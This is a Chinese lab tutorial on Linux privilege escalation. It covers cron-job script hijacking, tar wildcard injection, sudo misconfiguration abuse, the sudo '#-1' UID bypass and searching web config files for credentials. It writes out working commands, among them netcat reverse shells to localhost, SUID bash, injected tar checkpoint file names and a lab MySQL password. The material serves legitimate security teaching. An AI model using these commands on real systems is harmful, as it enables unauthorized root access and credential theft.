<p>初始化成功之后，你在 shiyanlou 用户主目录下能看到 <a href="http://cleanup.py/"><code class="language-plaintext highlighter-rouge">cleanup.py</code></a> 文件和 <code class="language-plaintext highlighter-rouge">trashDirectory</code> 目录，如上图所示。</p>

<p><code class="language-plaintext highlighter-rouge">trashDirectory</code> 目录下有 <code class="language-plaintext highlighter-rouge">error.log</code> 和 <code class="language-plaintext highlighter-rouge">readme.txt</code> 两个文件</p>

<p><img src="..\images\2021-01-23_32.jpg" alt="图片描述" /></p>

<p>我们的实验目标如下：</p>

<p>通过 <code class="language-plaintext highlighter-rouge">crontab</code> 添加一个定时任务，每 1 分钟通过调用 <code class="language-plaintext highlighter-rouge">cleanup.py</code> 脚本清除 <code class="language-plaintext highlighter-rouge">~/trashDirectory</code> 目录下的所有数据。脚本 <a href="http://cleanup.py/"><code class="language-plaintext highlighter-rouge">cleanup.py</code></a> 的代码很简单，通过 <code class="language-plaintext highlighter-rouge">os.system()</code> 函数调用 rm 系统命令来清空 <code class="language-plaintext highlighter-rouge">~/trashDirectory</code> 目录：</p>

<p><img src="..\images\2021-01-23_33.jpg" alt="图片描述" /></p>

<p>接下来使用如下命令在 crontab 中添加一条定时任务:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>vim /etc/crontab
<span class="k">*</span> <span class="k">*</span>     <span class="k">*</span> <span class="k">*</span> <span class="k">*</span>   root    python /home/shiyanlou/cleanup.py
</code></pre></div></div>

<p><img src="..\images\2021-01-23_34.gif" alt="pic" /></p>

<p>由于我们的实验机器上 cron 服务默认是关闭的，所以我们需要手动使用下列命令开启 cron 服务：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>service cron start
</code></pre></div></div>

<p><img src="..\images\2021-01-23_35.jpg" alt="图片描述" /></p>

<p>接下来我们进入 ~/trashDirectory 目录，使用 ls 命令查看文件夹下的文件：</p>

<p><img src="..\images\2021-01-23_36.jpg" alt="图片描述" /></p>

<p>可以看到，大概一分钟后 <code class="language-plaintext highlighter-rouge">~/trashDirectory</code> 文件夹下数据被清空，说明 cron jobs 正常执行。</p>

<p>至此，我想大家应该已经理解了 cron 的基本用法，那么下面我们就开始学习如何通过 Cron Jobs 提权。</p>

<h4 id="2通过重写-crontab-调用脚本提权">2.通过重写 crontab 调用脚本提权</h4>

<p>使用如下命令查看主机上的计划任务:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /etc/crontab<span class="p">;</span>
</code></pre></div></div>

<p><img src="..\images\2021-01-23_37.jpg" alt="图片描述" /></p>

<p>有一条定时任务引起了我们注意：系统每分钟执行一个 ~/cleanup.py 脚本，并且是以 root 用户的权限运行。</p>

<p>我们查看一下 <code class="language-plaintext highlighter-rouge">~/cleanup.py</code> 脚本文件的内容：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /home/shiyanlou/cleanup.py
</code></pre></div></div>

<p><img src="..\images\2021-01-23_38.jpg" alt="图片描述" /></p>

<p>发现是一个定时清理目录的任务。</p>

<p>接下来我们再查看该脚本的权限:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> <span class="nt">-al</span> /home/shiyanlou/cleanup.py
</code></pre></div></div>

<p><img src="..\images\2021-01-23_39.jpg" alt="图片描述" /></p>

<p>发现了吗？ <code class="language-plaintext highlighter-rouge">cleanup.py</code> 的文件权限设置存在风险：其他用户也拥有 <code class="language-plaintext highlighter-rouge">w</code> 权限，这意味着我们可以编辑修改 cleanup.py 的内容!</p>

<p>由于 cleanup.py 是以 root 权限运行的，因此我们可以利用的提权的方法非常多，下面我们列举两种方法。</p>

<h4 id="3利用-cleanuppy-反弹-root-权限的-shell">3.利用 cleanup.py 反弹 root 权限的 shell</h4>

<p>修改 <code class="language-plaintext highlighter-rouge">cleanup.py</code> 脚本执行的命令为如下命令：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 使用 nc 向本地 4444 端口反弹一个 shell</span>
nc 127.0.0.1 4444 <span class="nt">-e</span> /bin/bash
</code></pre></div></div>

<p><img src="..\images\2021-01-23_40.gif" alt="图片描述" /></p>

<p>然后执行如下命令监听本地的 4444 端口：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lnvp</span> 4444
</code></pre></div></div>

<p><img src="..\images\2021-01-23_41.jpg" alt="图片描述" /></p>

<p>等待一会之后，成功接收到了反弹回的 shell，并且是 root 权限。</p>

<h4 id="4构建-suid-提权">4.构建 SUID 提权</h4>

<p>还记得之前我们讲过的 SUID 提权吗？我们也可以通过 <code class="language-plaintext highlighter-rouge">cleanup.py</code> 脚本将某些可执行文件修改为 S 权限，这样我们便可以利用它进行 SUID 提权，例如为 bash 添加 S 权限。</p>

<p>此时 <code class="language-plaintext highlighter-rouge">/bin/bash</code> 是没有 s 权限的：</p>

<p><img src="..\images\2021-01-23_42.jpg" alt="图片描述" /></p>

<p>和之前一样，修改 <code class="language-plaintext highlighter-rouge">cleanup.py</code> 脚本执行的命令为如下命令：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod</span> +s /bin/bash
</code></pre></div></div>

<p><img src="..\images\2021-01-23_43.jpg" alt="图片描述" /></p>

<p>稍等一下，查看 <code class="language-plaintext highlighter-rouge">/bin/bash</code> 发现已经拥有了 s 权限，所以定时任务成功执行：</p>

<p><img src="..\images\2021-01-23_44.jpg" alt="图片描述" /></p>

<p>如上图所示，使用 <code class="language-plaintext highlighter-rouge">bash -p</code> 即可获取 root 权限。</p>

<h4 id="5crontab-通配符注入提权">5.crontab 通配符注入提权</h4>

<p>实际渗透测试中，经常还会遇到 crontab 和 「Linux 通配符注入」结合进行提权的场景，但是由于通配符注入需要讲的内容还比较多，所以我们会在下一章中给大家介绍这种方法。</p>

<h3 id="五-通配符注入提权">五. 通配符注入提权</h3>

<h4 id="1什么是通配符">1.什么是通配符</h4>

<p>对 Linux 有一定了解的同学应该会知道通配符，通配符是一个字符或一组字符，可以用来替换某些范围/类别的字符。</p>

<p>下面是一些常见的通配符：</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">*</code> 星号可以与文件名中的任意数量的字符匹配，包括 0 个字符。</li>
  <li><code class="language-plaintext highlighter-rouge">?</code> 问号用于匹配任意单个字符。</li>
  <li><code class="language-plaintext highlighter-rouge">[]</code> 括号内包括一组字符，其中任何一个字符都可以匹配该位置上的单个字符。</li>
  <li><code class="language-plaintext highlighter-rouge">~</code> 单词开头的波浪符表示当前用户的主目录的名称。如果该字符后面是另一个用户的登录名，则表示该用户的主目录。</li>
</ul>

<p>其中，在实际的 Linux 提权中，我们使用到比较多的是<code class="language-plaintext highlighter-rouge">*</code>和<code class="language-plaintext highlighter-rouge">-</code>，首先通过一个示例了解一下 Linux shell 对<code class="language-plaintext highlighter-rouge">-</code>字符会怎么处理的。</p>

<p>可以看到当前目录下有一个文件名为<code class="language-plaintext highlighter-rouge">—-help</code>的文件，大家先思考并尝试一下，你要如何查看他的内容呢？</p>

<p><img src="..\images\2021-01-23_45.jpg" alt="图片描述" /></p>

<p>如果你使用 <code class="language-plaintext highlighter-rouge">cat —-help</code>命令查看，会有如下提示：</p>

<p><img src="..\images\2021-01-23_46.jpg" alt="图片描述" /></p>

<p>类似的，如果你使用 <code class="language-plaintext highlighter-rouge">vim —-help</code> 查看也是一样的：</p>

<p><img src="..\images\2021-01-23_47.jpg" alt="图片描述" /></p>

<p>这是因为在 Linux shell 中，<code class="language-plaintext highlighter-rouge">-</code>会被解释为命令参数，如果你要查看-<code class="language-plaintext highlighter-rouge">—help</code> 文件的内容，就需要避免以<code class="language-plaintext highlighter-rouge">-</code>为文件名的开头，例如你可以使用：</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">cat</span> <span class="o">~</span><span class="sr">/--hel</span><span class="err">p
</span></code></pre></div></div>

<p><img src="..\images\2021-01-23_48.jpg" alt="图片描述" /></p>

<p>这样就可以避免 shell 将<code class="language-plaintext highlighter-rouge">—-help</code> 解释为参数，而通配符注入正好就是利用的 shell 这一特点。</p>

<p>通配符注入通常会和 cron job 结合使用，下面我们通过实战来理解 tar 命令的通配符注入。</p>

<h4 id="2crontab-tar-通配符注入">2.Crontab Tar 通配符注入</h4>

<p><img src="..\images\2021-01-23_49.jpg" alt="图片描述" /></p>

<p>如上图所示，实验环境初始化完成后，我们切换到了 tomcat-syl 用户（用于模拟攻击者获取的初始 shell），接下来需要通过利用 tar 通配符注入漏洞提权到 root 权限。</p>

<p>首先使用如下命令查看 <code class="language-plaintext highlighter-rouge">crontab</code> 中有哪些定时任务：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /etc/crontab<span class="p">;</span>
</code></pre></div></div>

<p><img src="..\images\2021-01-23_50.jpg" alt="图片描述" /></p>

<p>可以看到上图红框中，管理员配置了这样一条定时任务：每分钟执行一次，将 <code class="language-plaintext highlighter-rouge">/var/www/html/</code> 文件夹中的所有内容打包到 <code class="language-plaintext highlighter-rouge">/var/backups/html.tgz</code> 进行备份。</p>

<p>接下来我们查看 <code class="language-plaintext highlighter-rouge">/var/www/html</code> 目录下有哪些文件：</p>

<p><img src="..\images\2021-01-23_51.jpg" alt="图片描述" /></p>

<p>想利用 tar 进行通配符注入，我们需要在 <code class="language-plaintext highlighter-rouge">/var/www/html/</code> 文件夹下创建以下 3 个文件：</p>

<p>创建 <code class="language-plaintext highlighter-rouge">shell.sh</code>，内容为使用 <code class="language-plaintext highlighter-rouge">nc</code> 反弹 shell 到本地 4444 端口：</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">cd</span> <span class="o">/</span><span class="kd">var</span><span class="sr">/www/</span><span class="nx">html</span><span class="o">/</span>
<span class="nx">echo</span> <span class="dl">'</span><span class="s1">nc 127.0.0.1 4444 -e /bin/bash</span><span class="dl">'</span> <span class="o">&gt;</span> <span class="nx">shell</span><span class="p">.</span><span class="nx">sh</span>
</code></pre></div></div>

<p>创建名为<code class="language-plaintext highlighter-rouge">--checkpoint-action=exec=sh shell.sh</code>的文件，因为文件名中有空格，所以需要使用引号报告：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">""</span> <span class="o">&gt;</span> <span class="s2">"--checkpoint-action=exec=sh shell.sh"</span>
</code></pre></div></div>

<p>最后创建一个名为 <code class="language-plaintext highlighter-rouge">--checkpoint=1</code> 的文件:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">""</span> <span class="o">&gt;</span> <span class="nt">--checkpoint</span><span class="o">=</span>1
</code></pre></div></div>

<p>创建成功后，可以看到 <code class="language-plaintext highlighter-rouge">/var/www/html/</code> 文件夹下有这样几个文件：</p>

<p><img src="..\images\2021-01-23_52.jpg" alt="图片描述" /></p>

<p>当定时任务中的如下命令被执行时:</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">tar</span> <span class="o">-</span><span class="nx">zcf</span> <span class="o">/</span><span class="kd">var</span><span class="sr">/backups/</span><span class="nx">html</span><span class="p">.</span><span class="nx">tgz</span> <span class="o">/</span><span class="kd">var</span><span class="sr">/www/</span><span class="nx">html</span><span class="cm">/*
</span></code></pre></div></div>

<p>实际上等同于执行：</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">tar</span> <span class="o">-</span><span class="nx">zcf</span> <span class="o">/</span><span class="kd">var</span><span class="sr">/backups/</span><span class="nx">html</span><span class="p">.</span><span class="nx">tgz</span> <span class="o">--</span><span class="nx">checkpoint</span><span class="o">=</span><span class="mi">1</span> <span class="o">--</span><span class="nx">checkpoint</span><span class="o">-</span><span class="nx">action</span><span class="o">=</span><span class="nx">exec</span><span class="o">=</span><span class="nx">sh</span> <span class="nx">shell</span><span class="p">.</span><span class="nx">sh</span> <span class="nx">shell</span><span class="p">.</span><span class="nx">sh</span> <span class="nx">index</span><span class="p">.</span><span class="nx">html</span> <span class="nx">index</span><span class="p">.</span><span class="nx">nginx</span><span class="o">-</span><span class="nx">debian</span><span class="p">.</span><span class="nx">html</span>
</code></pre></div></div>

<p>参数解释：</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">—-checkpoint</code>和<code class="language-plaintext highlighter-rouge">—-chekpoint-action</code>参数通常一起使用，前者为设置检查点，后者为到达检查点时要执行的操作。</li>
  <li><code class="language-plaintext highlighter-rouge">--checkpoint-action=exec=sh shell.sh</code> 则表示达到检查点时执行 shell.sh 脚本文件。</li>
</ul>

<p>也就是说，每当定时任务被执行时，tar 都会调用 <code class="language-plaintext highlighter-rouge">shell.sh</code> 脚本并执行，而 shell.sh 脚本会将 <code class="language-plaintext highlighter-rouge">/bin/bash</code> 反弹到 127.0.0.1 的 4444 端口。</p>

<p>我们在当前 shell 中使用 nc 监听本地 4444 端口，命令如下：</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">nc</span> <span class="o">-</span><span class="nx">lnvp</span> <span class="mi">4444</span>
</code></pre></div></div>

<p><img src="..\images\2021-01-23_53.jpg" alt="图片描述" /></p>

<p>稍微等待一会，当定时任务被执行时，我们就可以接收到被反弹回来的 shell，并且是 root 权限：</p>

<p><img src="..\images\2021-01-23_54.jpg" alt="图片描述" /></p>

<p>至此，我们成功提权到 root 用户。</p>

<p>不过关于 <code class="language-plaintext highlighter-rouge">tar</code> + <code class="language-plaintext highlighter-rouge">crontab</code> 提权存在两个限制条件，这里也给各位同学详细说明：</p>

<ul>
  <li>限制一：打包目录 html 需要「其他用户」拥有写(w)权限</li>
</ul>

<p>因为必须要有写入权限，我们才能在该目录创建 <code class="language-plaintext highlighter-rouge">shell.sh</code> 和其他两个文件：</p>

<p><img src="..\images\2021-01-23_55.jpg" alt="图片描述" /></p>

<ul>
  <li>限制二：crontab 中的 tar 命令必须<strong>不包含</strong>绝对路径，例如下面这种命令，通配符注入就会失败：</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span> <span class="k">*</span>     <span class="k">*</span> <span class="k">*</span> <span class="k">*</span>   root    <span class="nb">tar</span> <span class="nt">-zcf</span> /var/backups/html.tgz <span class="k">**</span>/var/www/html/<span class="k">***</span>
</code></pre></div></div>

<p>原因是当包含绝对路径时，通配符注入实际上执行的命令变成了：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">tar</span> <span class="nt">-zcf</span> /var/backups/html.tgz /var/www/html/--checkpoint<span class="o">=</span>1 /var/www/html/--checkpoint-action<span class="o">=</span><span class="nb">exec</span><span class="o">=</span>sh shell.sh /var/www/html/shell.sh /var/www/html/index.html /var/www/html/index.nginx-debian.html
</code></pre></div></div>

<p>这种情况下<code class="language-plaintext highlighter-rouge">/var/www/html/--checkpoint=1</code>和 <code class="language-plaintext highlighter-rouge">/var/www/html/--checkpoint-action=exec=sh shell.sh</code>就不会被 shell 解释为 tar 命令参数，所以无法注入成功。</p>

<h3 id="六-sudo提权">六. sudo提权</h3>

<h4 id="1什么是-sudo-权限">1.什么是 sudo 权限</h4>

<p>在 Linux 中，sudo 命令的作用是让当前用户以 root 或其他用户身份（取决于 /etc/sudoers 文件配置）运行命令，sudo 这个词是「<strong>S</strong>uper <strong>U</strong>ser <strong>Do</strong> root privilege task」的缩写。</p>

<p>而 <code class="language-plaintext highlighter-rouge">/etc/sudoers</code>就是 sudo 权限的配置文件，该文件用于配置具有 sudo 权限的用户和组，当你使用 sudo 运行任何命令时，Linux 系统会检查 sudoers 文件中配置的用户名或组，若当前用户和当前用户所在的用户组均不在 sudoers 文件中，则不能使用 sudo 命令。</p>

<h4 id="2sudo-配置文件语法">2.Sudo 配置文件语法</h4>

<p>sudo 的配置文件是 <code class="language-plaintext highlighter-rouge">/etc/sudoers</code>，使用如下命令查看实验主机上 <code class="language-plaintext highlighter-rouge">sudoers</code> 的配置：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo cat</span> /etc/sudoers
</code></pre></div></div>

<p><img src="..\images\2021-01-23_56.jpg" alt="图片描述" /></p>

<p>重点关注 <code class="language-plaintext highlighter-rouge"># User Privilege specification</code> 这行下面的内容，此处是针对特定的用户配置 sudo 权限，如上图所示可以看到一条配置：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root    <span class="nv">ALL</span><span class="o">=(</span>ALL:ALL<span class="o">)</span> ALL
</code></pre></div></div>

<p>这行配置的含义如下图所示（Tag 是可选的）：</p>

<p><img src="..\images\2021-01-23_57.jpg" alt="图片描述" /></p>

<p>这行配置意为：root 用户在所有的主机上，能够以<strong>任何用户</strong>、<strong>任何用户组</strong>的权限，执行<strong>任何命令。</strong></p>

<p>很多同学会有疑惑，上面提到的”<strong>任何用户/任何用户组</strong>“是什么意思呢？</p>

<p>其实是因为我们在执行 sudo 命令时，可以使用<code class="language-plaintext highlighter-rouge">-u</code>来指定命令以某个特定用户的权限运行，只要 sudoers 文件中配置允许就可以，例如我们想以用户 www-data 的权限来执行 whoami 命令：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-u</span> www-data <span class="nb">whoami</span>
</code></pre></div></div>

<p>同理也可以使用<code class="language-plaintext highlighter-rouge">-g</code> 来指定命令以某个特定用户组的权限运行。</p>

<p><code class="language-plaintext highlighter-rouge">Tag</code>是可选的，当被设置为 NOPASSWD 时，意味着执行 sudo 无需密码。</p>

<p>下面通过一个实例来说明如何配置 sudoers：</p>

<p>假设我们要允许用户 <code class="language-plaintext highlighter-rouge">lanqiao</code> 可以在所有主机上，以 root 用户的权限执行 more 和 cp 命令且无需输入密码，那么可以这样配置：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 多个命令用,分割</span>
lanqiao <span class="nv">ALL</span><span class="o">=(</span>root:root<span class="o">)</span> NOPASSWD:/bin/cp,/bin/more
<span class="c"># 用户和用户组相同时，可以简写为一个</span>
lanqiao <span class="nv">ALL</span><span class="o">=(</span>root<span class="o">)</span> NOPASSWD:/bin/cp,/bin/more
</code></pre></div></div>

<p>理论知识先讲到这里，相信大家对 sudoers 的配置语法已经有了基本的理解，下面我们通过实验来学习几种常见的通过 sudo 提权的方法。</p>

<h4 id="3具有-root-权限的命令">3.具有 root 权限的命令</h4>

<p>这种情况是指：可以通过 sudo 以 root 权限执行某些命令，并通过这些命令获得一个 root 权限的 shell，又细分了两种情况：</p>

<ul>
  <li>允许执行某个或某些命令，且未对命令参数做限制</li>
  <li>只允许执行某条带参数的具体命令</li>
</ul>

<h5 id="第一种sudo-允许执行某个命令但未对命令参数做限制">第一种：sudo 允许执行某个命令，但未对命令参数做限制</h5>

<p>使用<code class="language-plaintext highlighter-rouge">sudo -l</code>命令查看当前用户的 sudo 权限：</p>

<p><img src="..\images\2021-01-23_58.jpg" alt="图片描述" /></p>

<p>如上图所示，可以看到如下一行配置：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>root<span class="o">)</span> NOPASSWD:/usr/bin/find
</code></pre></div></div>

<p>等同于：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tomcat-syl <span class="nv">ALL</span><span class="o">=(</span>root<span class="o">)</span> NOPASSWD:/usr/bin/find
</code></pre></div></div>

<p>意为 tomcat-syl 被允许以 root 权限执行 find 命令，并且无需密码。这种场景的提权方法和实验四中我们讲过的 SUID 提权非常相似，可以通过下面这条命令提权：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>find /home <span class="nt">-exec</span> /bin/bash <span class="se">\;</span>
</code></pre></div></div>

<p><img src="..\images\2021-01-23_59.jpg" alt="图片描述" /></p>

<p>可以看到成功提权到 root 权限，原理如果不清楚的同学可以再回去看一下实验四，这里不再赘述。</p>

<p>如果是其他命令，和之前实验四中我们讲过的一样，可以通过以下网址查询提权方法：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/iSecurity-Club/Pentest-Methodologies/tree/master/PostExploit/LinuxPE/SUID/Summary
</code></pre></div></div>

<p><img src="..\images\2021-01-23_60.jpg" alt="图片描述" /></p>

<p>通过搜索找到对应的命令，查看详情便可知道具体提权方法。</p>

<h5 id="第二种sudo-允许执行某条带参数的具体命令">第二种：sudo 允许执行某条带参数的具体命令</h5>

<p>同样使用<code class="language-plaintext highlighter-rouge">sudo -l</code>命令查看当前用户的 sudo 权限：</p>

<p><img src="..\images\2021-01-23_61.jpg" alt="图片描述" /></p>

<p>可以看到如下一行配置：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>root<span class="o">)</span> NOPASSWD: /bin/less /var/log/messages
</code></pre></div></div>

<p>等同于：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tomcat-syl <span class="nv">ALL</span><span class="o">=(</span>root<span class="o">)</span> NOPASSWD: /bin/less /var/log/messages
</code></pre></div></div>

<p>注意: <code class="language-plaintext highlighter-rouge">/bin/less</code>和<code class="language-plaintext highlighter-rouge">/var/log/messages</code>之前没有<code class="language-plaintext highlighter-rouge">,</code> 说明这是一条完整的命令。</p>

<p>意为:tomcat-syl 被允许以 root 权限执行命令 <code class="language-plaintext highlighter-rouge">less /var/log/messages</code>，这种情况下由于命令参数被写死，所以发挥空间就没有第一种那么大了，一般只有特定的一些情况可以提权，less 命令是其中之一。</p>

<p>键入命令 <code class="language-plaintext highlighter-rouge">sudo less /var/log/messages</code> 查看日志，随后输入 <code class="language-plaintext highlighter-rouge">!/bin/bash</code>可以获得一个 root 权限的 shell：</p>

<p><img src="..\images\2021-01-23_62.gif" alt="图片描述" /></p>

<h4 id="4sudo-自身的漏洞">4.sudo 自身的漏洞</h4>

<p>首先使用 sudo -l 查看当前用户的 sudo 权限:</p>

<p><img src="..\images\2021-01-23_63.jpg" alt="图片描述" /></p>

<p>注意<code class="language-plaintext highlighter-rouge">ALL</code> 和<code class="language-plaintext highlighter-rouge">!root</code>之间是用逗号隔开的，意为：tomcat-syl 用户可以以<strong>任意非 root</strong> 身份运行所有的命令且无需密码。</p>

<p>例如我们指定以 shiyanlou 用户的身份运行 whomai 命令：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-u</span> shiyanlou <span class="nb">whoami</span>
</code></pre></div></div>

<p><img src="..\images\2021-01-23_64.jpg" alt="图片描述" /></p>

<p>如上图所示，此时的用户权限为 shiyanlou。</p>

<p>若指定以 root 用户的身份运行 ，则系统会提示输入密码：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-u</span> root <span class="nb">whoami</span>
</code></pre></div></div>

<p><img src="..\images\2021-01-23_65.jpg" alt="图片描述" /></p>

<p>看来我们无法通过常规的 sudo 提权方法提升至 root 权限，但是别着急，下面我们再尝试一下 sudo 本身的漏洞。</p>

<p>首先使用 <code class="language-plaintext highlighter-rouge">sudo —-verison</code> 来查看实验主机上 sudo 的版本：</p>

<p><img src="..\images\2021-01-23_66.jpg" alt="图片描述" /></p>

<p>如上图所示，sudo 版本为 1.8.16。</p>

<p>这里要为大家介绍一个在渗透测试中用的非常多的网站——<code class="language-plaintext highlighter-rouge">「exploit-db」</code>，是 Kali Linux 开发团队维护用于收集公开漏洞情报的平台，在 Kali Linux 中内置的 searchsploit 命令行工具对应的数据就来自<code class="language-plaintext highlighter-rouge">「exploit-db」</code>，网址如下：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.exploit-db.com/
</code></pre></div></div>

<p><img src="..\images\2021-01-23_67.jpg" alt="图片描述" /></p>

<p>左边选择 <code class="language-plaintext highlighter-rouge">EXPLOITS</code>，点击右上角的搜索图标，输入 <code class="language-plaintext highlighter-rouge">sudo 1.8</code> 进行搜索：</p>

<p><img src="..\images\2021-01-23_68.jpg" alt="图片描述" /></p>

<p>搜索结果中展示了几个 sudo 的漏洞，点击<code class="language-plaintext highlighter-rouge">sudo 1.8.27 - Security Bypass</code>查看详情：</p>

<p><img src="..\images\2021-01-23_69.jpg" alt="图片描述" /></p>

<p>该漏洞的影响范围是 sudo &lt; 1.2.28，我们实验环境中是 1.2.16，很幸运的也在影响范围内，该漏洞的原理如下：</p>

<blockquote>
  <p>当用户在使用 sudo 命令时，通过指定 UID 为 #-1 或 #4294967295，就可以以 root 身份执行命令。 这是因为命令在将 UID 转换为对应用户时，会将 -1 或 4294967295 这两个异常数字视为 0，而 0 是 root 用户的 UID。</p>
</blockquote>

<p>下面我们尝试一个这个漏洞，在命令行执行以下命令：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-u</span> <span class="s2">"#-1"</span> <span class="nb">whoami
sudo</span> <span class="nt">-u</span> <span class="s2">"#4294967295"</span> <span class="nb">whoami</span>
</code></pre></div></div>

<p><img src="..\images\2021-01-23_70.jpg" alt="图片描述" /></p>

<p>如上图所示，我们成功绕过了 sudoers 配置文件的限制。</p>

<p>类似于之前 SUID 提权中提到的，使用如下命令便可获得一个 root 权限的 shell:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-u</span> <span class="s2">"#-1"</span> bash <span class="nt">-p</span>
</code></pre></div></div>

<p><img src="..\images\2021-01-23_71.jpg" alt="图片描述" /></p>

<p>当然 sudo 还有其他漏洞可以被利用来提权，我们这里只是抛砖引玉，同学们在实战的时候可以根据 sudo 的版本，在 exploitdb 上查询具体的漏洞来进行利用。</p>

<h3 id="七-查找敏感文件提权">七. 查找敏感文件提权</h3>

<p>假设我们已经通过 Web 漏洞反弹回一个 shell，是 www-data 用户的权限。</p>

<p>通过尝试之前几个实验中的方法都未成功，那么我们可以尝试在 Linux 上是否能寻找到一些认证信息，并利用该认证信息进行提权。</p>

<p>在本章中，我们会通过两个实验，分别从 <code class="language-plaintext highlighter-rouge">Web 服务配置文件</code>和<code class="language-plaintext highlighter-rouge">用户配置文件</code>入手，收集信息并完成提权。</p>

<h4 id="web-服务配置文件">Web 服务配置文件</h4>

<p>有时候通过查找服务器上的 Web 配置文件，可以发现数据库的连接账户和密码。登录数据库后，通过收集数据库中存储的用户密码，并且管理员如果存在密码复用的情况，即可完成提权，下面我们通过一个具体的实验来理解一下。</p>

<p><img src="..\images\2021-01-23_72.jpg" alt="图片描述" /></p>

<p>如上图所示，实验环境初始化完成，此时我们切换到了 <code class="language-plaintext highlighter-rouge">www-data</code> 用户——用于模拟通过 Web 漏洞反弹回的初始 shell。</p>

<p>通常情况下，Linux Web 服务存放的路劲为 <code class="language-plaintext highlighter-rouge">/var/www</code> 目录，在该路径下我们重点关注以下文件：</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">database.php</code></li>
  <li><code class="language-plaintext highlighter-rouge">user.php</code></li>
  <li><code class="language-plaintext highlighter-rouge">*.config</code></li>
  <li><code class="language-plaintext highlighter-rouge">config.php</code></li>
</ul>

<p>我们可以通过以下命令来搜索：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find /var/www <span class="nt">-type</span> f <span class="se">\(</span> <span class="nt">-iname</span> <span class="s2">"user.php"</span> <span class="nt">-o</span> <span class="nt">-iname</span> <span class="s2">"database.php"</span> <span class="nt">-o</span> <span class="nt">-iname</span> <span class="s2">"config.php"</span> <span class="nt">-o</span> <span class="nt">-iname</span> <span class="s2">"*.config"</span> <span class="se">\)</span> 2&gt;/dev/null
</code></pre></div></div>

<p>当然不仅限于以上文件，<strong>并且如果目标主机采用了 CMS，我们可以通过谷歌查询该 CMS 的默认数据库连接文件的存放位置</strong>。</p>

<p>在实验主机上，查看 /var/www 目录的文件：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nb">ls</span> <span class="nt">-lh</span> /var/www
</code></pre></div></div>

<p><img src="..\images\2021-01-23_73.jpg" alt="图片描述" /></p>

<p>我们发现主机使用了 WordPress 内容管理系统，通过谷歌查询得知，WordPress 的数据库配置信息存放在<code class="language-plaintext highlighter-rouge">$root/wp-config.php</code>，查看一下：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>more /var/www/wordpress/wp-config.php
</code></pre></div></div>

<p><img src="..\images\2021-01-23_74.jpg" alt="图片描述" /></p>

<p>如上图所示，成功找到了 MySQL 的 root 账户和密码：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:cD8M2M8fMiDHu4m1
</code></pre></div></div>

<p>考虑到管理员可能存在密码复用的情况，尝试使用密码 <code class="language-plaintext highlighter-rouge">cD8M2M8fMiDHu4m1</code> 登录系统 root 账户：</p>

<p><img src="..\images\2021-01-23_75.jpg" alt="图片描述" /></p>

<p>但是很可惜，并没有登录成功。</p>

<p>接下来我们登录 mysql 数据库，看看能否在数据库中发现一些信息：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql <span class="nt">-u</span> root <span class="nt">-p</span> <span class="nt">-h</span> 127.0.0.1
</code></pre></div></div>

